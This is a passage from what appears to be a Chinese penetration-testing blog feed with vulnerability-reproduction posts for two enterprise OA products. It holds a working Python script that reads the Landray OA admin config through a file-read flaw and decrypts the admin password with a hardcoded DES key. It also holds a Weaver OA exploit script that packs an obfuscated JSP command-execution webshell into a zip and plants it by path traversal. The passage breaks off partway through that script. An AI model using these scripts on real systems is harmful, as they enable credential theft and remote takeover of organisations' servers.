class="string">&#x27;127.0.0.1:8080&#x27;</span>, <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EncryptDate</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.length = DES.block_size</span><br><span class="line">        self.aes = DES.new(self.key, DES.MODE_ECB)</span><br><span class="line">        self.unpad = <span class="keyword">lambda</span> date: date[<span class="number">0</span>:-<span class="built_in">ord</span>(date[-<span class="number">1</span>])]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        count = <span class="built_in">len</span>(text.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        print(count)</span><br><span class="line">        add = self.length - (count % self.length)</span><br><span class="line">        print(add)</span><br><span class="line">        entext = text + (<span class="built_in">chr</span>(add) * add)</span><br><span class="line">        print(entext)</span><br><span class="line">        <span class="keyword">return</span> entext</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, decrData</span>):</span>  <span class="comment"># 解密函数</span></span><br><span class="line">        print(<span class="string">&#x27;==========&gt;&gt;密文解密中&#x27;</span>)</span><br><span class="line">        res = base64.decodebytes(decrData.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">        msg = self.aes.decrypt(res).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;==========&gt;&gt;解密成功密码为： &#x27;</span>+msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Landraypass</span>(<span class="params">url</span>):</span></span><br><span class="line">    urllist = url+<span class="string">&#x27;/sys/ui/extend/varkind/custom.jsp&#x27;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;DNT&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;var&quot;</span>: <span class="string">&quot;&#123;\&quot;body\&quot;:&#123;\&quot;file\&quot;:\&quot;/WEB-INF/KmssConfig/admin.properties\&quot;&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    passlist = requests.post(urllist, headers=headers, proxies=proxy, data=data)</span><br><span class="line">    print(<span class="string">&#x27;==========&gt;&gt;正在抓取DES密文&#x27;</span>)</span><br><span class="line">    passDes = re.findall(<span class="string">&#x27;(?&lt;=password = )(.*?)(?=\\\\r)&#x27;</span>,passlist.text,re.I)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(passDes) == <span class="number">0</span> :</span><br><span class="line">        print(<span class="string">&#x27;==========!!:抓取密码失败可进行手动测试确认&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        passDeslist = passDes[<span class="number">0</span>]</span><br><span class="line">        print(<span class="string">&#x27;==========&gt;&gt;密文抓取成功： &#x27;</span>+passDeslist)</span><br><span class="line">        cr = EncryptDate(<span class="string">b&#x27;kmssAdmi&#x27;</span>)</span><br><span class="line">        cr.decrypt(passDeslist)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(sys.argv) == <span class="number">2</span>):</span><br><span class="line">        url = sys.argv[<span class="number">1</span>]</span><br><span class="line">        Landraypass(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;python3 Landraypass.py http://xx.xx.xx.xx&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> rce </tag>
            
            <tag> 蓝凌 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次rce 盲打小技巧</title>
      <link href="2021/05/14/%E8%AE%B0%E4%B8%80%E6%AC%A1fastjson-%E7%9B%B2%E6%89%93%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
      <url>2021/05/14/%E8%AE%B0%E4%B8%80%E6%AC%A1fastjson-%E7%9B%B2%E6%89%93%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抽根利群冷静下再想想！" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="420c7abb2412a4e56ef72b32b31b28bcb911dcd5db3e11382b35f678cc1283ab">09f7e28a2ee5cc0acb1a500e2b9fb1297435f08653cb47d2da75f53c9bdce32a16820912d1844e581a03f7cbba597a45bf7bdc57409694c6d8c79ef9a4efe06d7ee82643d7b01df0e7a71a79f6ab8add1df932970bb02bb798a97619626611f011a1c34b36c23234ab5b3e45d4e9ab57de159197a7a92bf982667afb86f4c7bee3dd681cdb254e975500a94c9b70865ac4996bfd67752fac9d36c928d050773fde5202e9f34bd270c79cca1d74906a7dd0562d11b076e10d263b941a9b7443447f3dc7a1a0978802cb3d3fe1ccacdf348f6c9868b3e3b6a8c7733ba514118349e57d0f0b83259517460d38b56ba19009d1c9cba062b2531fb350351ce97cda4faee87f294db64f55ffd287f5a5be4a773842d291399f4a796ef9410632b94899c0470d5250f91ecb88a1b6a617b3d15bfd2e101515a81c01f5218948c2d597864adf3c65b6a0858c83b60b7eebdb033807acf04ebd3255f737eb51c287b03bd3f2ac57277389547deb83bf38048ff4dc7bc2d433c3cdd73ee10755fb31446a8b73e1f5a5a34b4b05eda8ade1e7ee7201ef2ec390be2d1b583d1700b922eba3fa71c21bb1861f713aced094c5dbec1de0724ebccc514b1ee14fdeb72974b2cb3e5ef81c2a1d259398e1b12e540955dbb1f4dd64bc757477391f9412960cd7f761255dd1442f89e208368a167010ab24dde5882b189f58a3c2d3bde6ff0da2e2b3e8f37e1d278463fb8e0abadd53a50ddd1612750cad95dc5ad9afe509e6284b558d676c3d66067516ec6684df1245481956caf9d5771aabe3a4b88d3214eb08426b6ccab8a8c02ec6f670dbed05a8fe891a1f450c8b8adb81df523d41750599ef3adba0d421211ccac569a830dd2813ee6201f00277b05383d5297444fe790cd1e6e04c58dda341826f2b1a47b4491afa33403624b584719c9e60ca9537f10b942ccb4e8534eb82d32bed7353f6b02a62aedd0d9076cb93929ce681b5abbdd5cf4634f3631d9a490f2261c9fcb04381de77f133f11558f0c628a90cece2521ac7469f1e23a14897e80a1c4f554c9d55f375503cfc3838e696f1e58af096cb0317f76c64b343e446223c7ee705c5f27ffb84616576802485e514b4bba88dbb8605a713f50c3d6cd33610850b12aea45364c5be960ecf4246d0de54aad6c179dd998ae453d057118be0bc673a1ca9d8fd74d4a426234e5de17634a1bc3deac1c7894b59be56449e7899d3e639f07118465d7fab68235c178823183e0ba21eb32bfe9f758e200c687fbb6d453f2ea0843874e187a584323a5b421135872a8d1f8b08ce0ae7456ee7324bcbc5bd0afa31469db275bb668ee575345954914dd890c18c3f668c1c5b4595869a6b5393b3465aadfc3359913f17009d3ff7eddb355e3986486c87abb589cc82fe68c71b6109f59d42436b2d93e06deb40b1d49aac980a8c79a6e8a62c5b85daecb45bd289bc64686429ac24002b5b85815e3c9de8f891e5e51fa00f8ccbe90713f3a01c3b705b948b33d4f78caebd7e2c999280fdd7ad555a6680a5c8a08cc3b8a823d51a631488ab5c8dbab0f33827df0d7415479c34b5b10f53384357d094f78c6fe7db7931edc68baefdbc95f0e83c2f26292f7efce854ae49042e64c15298dc8089e87261b51f6ebdfad8434a03a0bb31ce7b5a32ddb4debb255db4d838e16747548a83058fa0118b0d2a53fc200f8306cfce59901916b44719a0ae5f6cfc28bd118682b5285fb317f50eae2cc31d290da325ba38f7dc25ef6333d135003d8e0511b6368886f4c4809bde82fe19d6203b0109dd611b1943e38cc24195604e4835e1d8779c4be1e0ce38b8a6bb813c3aeed883f9ca39e70c602550a908a0b5d85cb63f531310fd76639957370c5e0e00271b50e142367cbf971e66cc7cd500faae5a3bb5a80259e853b75bd2dc5bd0ef7886c1c84074efd99fdc5c06530d05ed954a364fb7cb013df6ee931d8f89d42b756d8637917638ee6d83f2b717614416c370f274c0fe89d7c74b2c64816a60fbb05fe788d9eed1a820893e33ab645165f88da9b5a68f287f4a2a9c0c323135fe24341d4b04b4f1a579b8f9c4a11ab7ed7e6959efe29aeb14881c5f56e08740a5fc56e40ef576ca4be1444f72577c3b1ab39ce567464f3db30f9d6be09873c9ebc6fad3c848fd688afd20836529468e3640c66fe04b8b9ce6346ded868d94f2304b7c0df5e25fc2e08f40487695c237c54b02fb42163a8a938383fb537b7d0c869eeb2ada85a3a1ee5e6b88a1b55b67fdae7cdc43c65cea3c9a109209f60af1f89450761523bd956d1aca5bf60766d4953b32445b5359edeab8b958b4eb757f70530e2f740a7b979041b3b6ee3144ce1c2ef88668c4b17146f3304bca390b8e949efc3574c01a791060c10376aca2d96040cff5a0ee9a79b5444afd358aad886b80db97f52a74de128cc929637b09e3a53b17ae1598c04cffd450ead7e1a0ab92692f02b067ab519c60a44687351a1afa2502992015108e061ee33024adc687a2e9990c2549719cd4ad0fcdade5443f5efef63a6b89c8cf43e4401439bf80f8d8a2b77dfd26781c1db15116a801b1734ab0afb336c80e1d11a8f558a9a66b395dd6440b2a2aead3a6f4ff6dd00fdc587c87bb2a6e7af519e14dcdb790a398611d2eff2d1815a6ce0427b6b365a8f10f0d385bc33b3cea2cb3f2aad226b2375279497bf668b76821863425f25aad40ab87155888d55c549874071ba39d790e8b275e76c3c07508e83e9775881d9ad8c096814d44f27923eb5f048d5feb421b9e865f5b9e0d172375764026b4cb90393128a8e93544b0fce40a855aeb8b67b750317839b255543b6797ac66e54a70734595fda393fb70c3cb21fda4ff9cc146d5bb6c1ef823329e9523de42d7bc7b1b21c3018e4a50675db807214972e298102ba7ac72774931cd2fd4cba3e04eb7f06ae5c2a6e2e09d68910f51815c0810aa275c105e05a65ddd5148d5e3e84cadf7e1ba63fe4d8c3cd8228f7a7b955c97e5661d8de3412ecc25b57741414926e0d70fbc90425723f50185bc69c76793b398bb1e96623db850bdfe2ea78ea28463fe8c3ce7707eedf708aea79866ea84818ff66ff5a7e863675be86d91594a531926860f838e6c569a274347dd1deaec9badcfb23aea854d53a1ade04c15c11245db225068e45d9962daf5fd1a5ca24dfa9e2282c4ff67eb8d58eb6634bec097ef67ba32604b8f811d97f20ffd4e1d544a30f5ca3df84a480fafa00b9509a14c197d212a8df8d8a2a8fa26f4b4edccfefd3350668c0bb48bf1724beea1a933128ac6821c7289723b9a8449cd253379b33200f0159d03ee2a0bdb7acd117245390c046404111a732ad10d5cefaefeb831a6213d5173f09b0ecdbeb8b0c60ccc522b59406dbdadc3602bc96b09d74d3d2618933a8501255e1ed89c3d6d67fb0dd78931c3c66546c3cc2adb667515911489cdc340440249fcc715fa2f8e9651f9e6d8350b281acca19c2d7e87654656d77aa506e49e1d31b53d960b9796dc6a2ae18db07d28a49d587ecca73430d2dfced017f95bcfec380a6b039d0c88d3c902aa7f630429514fdf352229ddb5404f26ffef4c96419b36daa25d54e7cb50a51dddad3ad2697f9909d9cf2c441715112bff91c52e2ba5fc02c84d49bed66749ba56439ccd3ea897c297dc9d0b10aaecedcea16ac463f9e008e00ec28edf5e042478fb55b1b0f5363cdd4a5d5395735eb78965ddb4af817d46751d467f6b0374af99b83915d79454235309c00fba74cccaaccf9d5375e250fd76fbd96182c6cc9594d01a12dc89305c2af960802d6f5d915c7500931818fc6a94c3c6c625e2ff359166632af532e2c691948d17f0b02d8ef36421424829806f62d740cdfe8e7a8dbedd1c0bbaf880c4ed971d6c7fdfe14102c164889e844d423adf52dfdb4418c0145d715fa9a9c7cd60475bde5564340b7d2ad11df8b889536616ad59ae30a53034a39ec2e792b4af743915d1972208c722943be2006248230377358002dc3f906171fcad341bbb7c7376035312509b81e294139f0af1baf797b1e2b9bd5cf1d06bf206c2c7ab45b4b50a2f54596fd7955bb7072ed0535b0807ebf5c46a63d36462264aa50ce2af2f2f564041c82e02d4fdf2bfa319e743effe4cd531c8ddeef89c00ffc87bdd184d98f0482d3fa64dd6f08a50b9b70302221df6539e523ebabf394025019126b5c68756e2288fdf5d74b390cf61cfc3596100c1f56bfcf0ee1ca747919bc4ba0b5111b4ef6cfbabe2cad95566deb7f504013d894c6e07e97f7c1b44b50a72ccd900165feacfa2deba4fd0c8559fc33396aac1727e2c617f35188b2fea8746093c3db7295066f9891825e26e152a158cd942c6e8b46e90a5fe2da165d2867be132a60bd5c5782d993ede1e4854ee950524ab35ff3c961c1e1d4102b24f88b34fa56dec8a505922c9ec0337d1389a16e55c82e9437d8a1a1760f9bc66fa5f8a089409bd1e2b4a66ace08fc2dc181e29e5437fb68e8054a789bc722941bd590778de1937c6e7f613b8c710d5f25a8e8884511abd84603cc4c446c9ebf60469c6288833b44e307d58ab55cb0dfe7ab765e6c9e221b7ba8088beb58217aeb4fa3398d5625862de17c4530d7516710aaea5f5d57c195cd5c197d318941278e150d345918eeb804eae99764cdefdd8edcf0b515bf29d4dbc10e710cdfee759862153f6be977239e99fbaa19fc22ca9c1422dacfb199792f7569f369fee61b12e5f0b881b2804c27a9b794f7e404f8831512471ab1a78544686e39497fb4c4a936251fd3d7cb35fd9edddbb888311a9ed844ef12175b17e71fabbde19fb1fd2c75f3952fcbd7fd8c5276fa7349f572359008a6ad50fe2ccadb184e6d10610a5d30d4d6b65a68996e850f55dd380d9bec48058bc27a48589eb9c3d7ceedbbedbb08308f5c92e1b256c5c04c52d1d5d769d400e4ad39b6aaf9fd26434f60723fec14553b19772dd010368ed85e68cf9add645cc664a743f49130622b9f1cdf2056250b35021babe0649c9d0705b03bad5338a6b480a37bf86ff3dc6fe4a9f7d012574703901c7d273ef56f74cea328fda608575953f3e382d24be2ba0dc4379fc62a3ab0b009c506ef6a3a1f257758099dfc66929d80daf7c3b962c871f20175f80046dee339c1a6ad9c89a5ebf374ac67a5dc7286e6998525490462d10f45752b442da8abd9c0f46d8370fb971161a0f265dc39b2586fdd0301c87db1408d71bbb79c70abe6a7557a55dd8eaa6a690c16e8a52e9bc69e6fdb685acc68f5ddeef65da124f0d6ff5512003b50a550e89deca2973536be729497dec7f96eaaa2aee6a15ecc6e165cd48903f8363d319eb764821fe098d390d409a0a691dd7f7cb6eb71e33ee7489acb352e9669de1b8f0e22c37d5396df2f950c5c5eef95fbea7782409a75e759f8b4951afbd188cef49ba2183a6ce0efe634f4f2ee0695f0a1ed0a02654b9d651fb9e0f375fc3a6baca73fbe0f04d8c20329085a250edbf0c428758c5414556cc29cb52105f04decc04f6a5691f38942b4afa25e0ddaf24c973be8cd4cbb493d8434e4712fc4654f99d10a2fb8d8aa27bbddaa2dc8ce76367776e3d607b6b88a77e2d9eb00c2b5cf68bf64206423f1524377a6e94fc1986736a230ea6829a9ab1138610ac0d1d9d2826632ecb87cbe5da8b83c41910f5c1592932d01b2f63bc73dd8eb5c0ef40d12f1d1760bb879b028704e3c8ea0b09ddf14697de995555d8865b9fcea19e0814e4fb17c72a08d6ee489e4e3a15765a411282c16ffd78cf4d9cff912dfb5e726f4451b17c7b1ebe9d88239870aa8dd49b235cb27d5971da769012ff3f8509d516783b77ec61a67c1560fff0ee7a8a1fa6e109234af105a024fb3441a7b6b5699d1a79739403c81a97ae92efd25741a7cf7a0651c2afe62585a67fa0bd9d0fbd304bf13b44ac677dd47bc92be535ffe8d089e27a8fe09a8bf037011be5659007f7e37eb129f0dd3a5c23f5fc9a5076694b0296efdeabf38eaa540d03db11c4f663cc57987acd1ffb1121f495e7cae7944c2dc518bff04dec4d619dcc38e248a35cad685b8c43d65296856cfa97c3a92fbaa9c64b1c55dc5ae58a9baf6b4593a69aee33f8708ed90232c7e664de79d09a23ced32b20d2a85f168fa09867b57ccfb2c63aae69f43119fb91b2f81cf0bcb2d6a19c8662a604dc416e46ac5d3ca5ae31a65be53ddeeaf27312e7b766b6ef979f146daae99bd75089c9291ae1ad51d685f4ba96920c931573c99da2f01f1550e2f22f1d73f780ce0e4c3c98de1c3dc6d2aa249c05a894c4ec41cac77dc7533ab8570763dcdb21aed4418725ab9e01c80a28d04082f24809191edf6439bcb5ef22cd88709ebae0648ac285720a286c9b2e206a7b7ff3361475aa5f55080b220b8a23bacc48d2c720058a6b81b8209c2be5a36b139607c55d212e2a2af766d394ef4e1ba61d9da5d33d91e5ca109d9be433134dc13d19329fdcb4e5666c2c3de9992e6131915249d3b0461ba733727f74d0225fdb91e88f8b960c4692c77b85f8fddb8759c229637bb4654884e11b81c1f7011e046013d566788366177ae537e66298eacf09c8b27c6653a730636ec24d4a01287e9a47d7d58c7138bf2ff778af8f3d662d8a59d0cbf715ac0edc3b309316b6090458304b64508c4fa93324b75f5aa9f8b2dddeac93563b231cd02bfad1596d4a28c62223c7ddee9eb83cebe7ecb9bcd399670fc2adfb42aa0b1e0eef6f90ec7ea1034d51c9b79f60fa73adf25ff9437fc3602b9781813b4f149a8991d8bc65027728be43f9fa0c6e4081590861d1114a38038fa7cea7c6f02b7585205196e7217fd6703c6bd8a66b5841fbd5670b2a3cee2febe19c2c8e27e205ef11a0b588464eb2d8750993cec6657f8f7f30855a9fe10c41003b9213ed6e65aad40f497b064431735a065301813fba2ff6bb05eea6b6513f7bf0f5609a14bddf7bdcfbf89c5c00a0f8eec77175f193148b100566e9f8c879ac9fd8d9bfc9668c8423063af14a605703b6654af537b5999ec1eada2b409eb32776cbfa4f39a7c7d641cbc28dbe890f5864738048bd7268ee5f4d98c26369d4d31de15fc8fd37e9f54c8e62df8b6dfd58628994365e9215ea2e4a5492ac2d96c0baf20faa7f58eb5639cb37156e3ec7a6efad0cb344a4633d3df5b68f9d49b6a99b86daa79ba6b0217fadfc35666536f2f71285ebb5094bf7d66c60eb2e5d326e0f592e4d7fb1872af0516f1947baea0056594cdcc3bd1384fbf796aef64634df694e6d864a0e54d838f0af5c1758b3f7113b4dc2892ec1a04c9ff1c6ab24feb1ba6dbb2d9036d2cf5d98f4ad5ad6c580088b470840bb2f1fcc09825112094cc6de6af3154a0865358fe3acbb3ece0c98caa7aa73c24687eb9931aa58b51c42b4bf6c77319270ed9dbd7741af5875d5bb1ce8954dc99638beccdac494e01a9b3dc711d6a6ad60d71cd5514dc9684c51727bd2991d0d021436fefada756e7d6d4efce241b39d3e3b31a39202d434924b40e0361350ac57ef0efc04551b0a66bc1a7adad0d779c50a6c296fdffd1fd149a43f4c4977447477db23b465cdcefd22af85508bc833db40fc85ff3cca547194a1ccf7b3e84270c9e8dca47935e828795e4c649539c60ddc783056ab4465bb17ec75018362e3f9742116461460bb62874ea13d27ef432572ec4bf5858862e30c7a87c04f5538bf193d9f2ce539bf227fd6cce7932568af14a1bd06d61580396b795c3f5ce659c72132e8c7b218379174af92676f16b0d86fdeafaf133f8c1fef3b7bbc62da4b97ddd60787a3e1fefbf7875926ed9b5101c6dc6ef8f9a1f3d2161f2c295643579f05656d66398bdf5d5ae9d2c66c17ac74f989c843e5f3a03132eaf37b6a78779ccf88201ac8998ac27617d1e51fda96f6bb6a0f39a08095a84c6e0bce850aaf9c0631e1c2fc8d196a72409db32981d661061ef4e920d492f5f04a11d2bc791589ae67b3a4709e6e893ed27098c9f280d4b79bcb9c998bb5c0c68361101fe66162833eb82508684d95bd557c79cbdf30911bcb6834474c76a18aace310b0bcf393597cd79e1363f471c34ee05c218825ecfe1413917334496cd366217f3a78c7c80f7b99693bcdf0ca7bd777708c5c8897ef129891fc372780a65a8d41c71e64a18f0796e7c7cf6f204d9e85e445e8ca00d03cda9e58227831b962dc12c1e682817c29e2bda863aecc9e8bd38052d8983317e3f2e379547de1b0b3bda05a75f6aac6b03809ec1fc221cc9b59324f3dcab5f5cb7fda10f7f1cdabdca9e26bb1cce152a8c96a1f535f2b880615467660a38ca92be48d034724b378004ad6ab19389e335d7242ab4a3915b1ac8a4fd284bd695b31292e7950279c87cef053a559b5f09fa5feb6ed0e6f7e9242014eb59939ebf8f53218fcee2c6176e1cc169495eeb8b18556b53af21773e0df9ed4317f0a5786fb95fc7651a81e79309ac47a10b3ee6200d12039dc0a9f8c30705e5e3bcb260fc44cd9052d62c212c4db51cd73c7001c1f6d64b920ae388507da75607562525c53e3e13fe4ecc3b833535c9f94dd9ce3e15a08ec3c23c845e45d582094cbcbce27cdcf302550a63c3003fe1405ce5f626e3cc6a5865b9d3a34d6e370592ee8bd2ca23f3f722500d426720126e27fcb03ce732712271e88d630b714d9317e267684020aac13cf0f508f8d73baffb25b943b69c4ccfd3a864e24146b855cde6abdcabdf3f34062e80c9923a3f30e04fdcaea74aea1668a9ff21823f3732ddc773818df42607a58e983f80ca9d5fd59b62b960a49edf4e22b1b3b79bcc5ca75feb9df68be7adfa65d8af653fa5ebbbf68e32cecfbc5bb73640a0cd980764538327f064932dd2749b6b512669c6b793745f67fbbdf04ae2436aec36a4232daaadd29ed27b2d7632ce7d41d974ceef316122b455706a44d60a5562d1bfdb9e86da1b53b2611b647c1ab5f7c71dd42f55b4ea9dcd93592b66820d3ca0a5e8e9fcce29d25db831fa2fab62017f47c97127ab913acb6db5145465431bffa7077d90a41</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂不公开                                                                                                                                                                                   .</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 渗透记录 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
            <tag> 实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>泛微OA 前台GetShell复现</title>
      <link href="2021/05/02/%E6%B3%9B%E5%BE%AEOA-%E5%89%8D%E5%8F%B0GetShell%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/05/02/%E6%B3%9B%E5%BE%AEOA-%E5%89%8D%E5%8F%B0GetShell%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="自行搭建环境："><a href="#自行搭建环境：" class="headerlink" title="自行搭建环境："></a>自行搭建环境：</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E6%B3%9B%E5%BE%AE1.webp" alt="image"></p><h3 id="漏洞路径："><a href="#漏洞路径：" class="headerlink" title="漏洞路径："></a>漏洞路径：</h3><pre><code>/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&amp;arg1=validateApp</code></pre><h3 id="漏洞验证："><a href="#漏洞验证：" class="headerlink" title="漏洞验证："></a>漏洞验证：</h3><h4 id="发送上传数据包："><a href="#发送上传数据包：" class="headerlink" title="发送上传数据包："></a>发送上传数据包：</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E6%B3%9B%E5%BE%AE2.webp" alt="image"></p><h4 id="验证结果："><a href="#验证结果：" class="headerlink" title="验证结果："></a>验证结果：</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E6%B3%9B%E5%BE%AE3.webp" alt="image"></p><h3 id="懒人"><a href="#懒人" class="headerlink" title="懒人:"></a>懒人:</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E6%B3%9B%E5%BE%AE4.webp" alt="image"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_random_str</span>(<span class="params">randomlength=<span class="number">16</span></span>):</span></span><br><span class="line">  random_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  base_str = <span class="string">&#x27;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line">  length = <span class="built_in">len</span>(base_str) - <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(randomlength):</span><br><span class="line">    random_str += base_str[random.randint(<span class="number">0</span>, length)]</span><br><span class="line">  <span class="keyword">return</span> random_str</span><br><span class="line"></span><br><span class="line">mm = generate_random_str(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">webshell_name1 = mm+<span class="string">&#x27;.jsp&#x27;</span></span><br><span class="line">webshell_name2 = <span class="string">&#x27;../../../&#x27;</span>+webshell_name1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_zip</span>():</span></span><br><span class="line">    shell = <span class="string">&quot;&quot;&quot;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span></span><br><span class="line"><span class="string">&lt;%@ page import=&quot;sun.misc.BASE64Decoder&quot; %&gt;</span></span><br><span class="line"><span class="string">&lt;%</span></span><br><span class="line"><span class="string">    if(request.getParameter(&quot;cmd&quot;)!=null)&#123;</span></span><br><span class="line"><span class="string">        BASE64Decoder decoder = new BASE64Decoder();</span></span><br><span class="line"><span class="string">        Class rt = Class.forName(new String(decoder.decodeBuffer(&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;)));</span></span><br><span class="line"><span class="string">        Process e = (Process)</span></span><br><span class="line"><span class="string">                rt.getMethod(new String(decoder.decodeBuffer(&quot;ZXhlYw==&quot;)), String.class).invoke(rt.getMethod(new</span></span><br><span class="line"><span class="string">                        String(decoder.decodeBuffer(&quot;Z2V0UnVudGltZQ==&quot;))).invoke(null, new</span></span><br><span class="line"><span class="string">                        Object[]&#123;&#125;), request.getParameter(&quot;cmd&quot;) );</span></span><br><span class="line"><span class="string">        java.io.InputStream in = e.getInputStream();</span></span><br><span class="line"><span class="string">        int a = -1;</span></span><br><span class="line"><span class="string">        byte[] b = new byte[2048];</span></span><br><span class="line"><span class="string">        out.print(&quot;&lt;pre&gt;&quot;);</span></span><br><span class="line"><span class="string">        while((a=in.read(b))!=-1)&#123;</span></span><br><span class="line"><span class="string">            out.println(new String(b));</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        out.print(&quot;&lt;/pre&gt;&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">%&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>   <span class="comment">## 替换shell内容</span></span><br><span class="line">    zf = zipfile.ZipFile(mm+<span 